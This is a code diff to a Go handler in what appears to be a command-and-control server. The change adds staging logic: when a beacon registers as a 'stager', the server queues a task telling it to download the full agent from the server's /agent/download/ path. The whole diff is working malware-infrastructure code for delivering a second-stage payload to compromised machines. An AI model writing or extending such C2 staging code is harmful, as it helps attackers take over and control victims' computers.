@@ -64,6 +64,28 @@ func RegisterBeacon(w http.ResponseWriter, r *http.Request) {
 	message := fmt.Sprintf("\nBeacon From %s - %s - %s - %s", s.Ip, s.Hostname, s.User, s.Os)
 	event.EventServerVar.NotifyClients(message)
 
+	var regPayload map[string]interface{}
+	if err := json.Unmarshal(envelope.Data, &regPayload); err == nil {
+		if beaconType, ok := regPayload["beaconType"].(string); ok && beaconType == "stager" {
+			scheme := "http"
+			if r.TLS != nil {
+				scheme = "https"
+			}
+			downloadURL := fmt.Sprintf("%s://%s/agent/download/%s", scheme, r.Host, s.Id)
+			taskReq := &orstedrpc.TaskReq{
+				BeacondId:     s.Id,
+				Command:       downloadURL,
+				PrettyCommand: "agent_download",
+			}
+			_, err := orsteddb.AddTaskDb(taskReq)
+			if err != nil {
+				utils.PrintDebug("Error creating stager download task", err.Error())
+			} else {
+				utils.PrintInfo(fmt.Sprintf("Stager detected — queued download task for beacon %s: %s", s.Id, downloadURL))
+			}
+		}
+	}
+
 	w.Header().Set("Content-Type", "application/json")
 	var resp BEACON_ID_JSON
 	resp.Id = s.Id
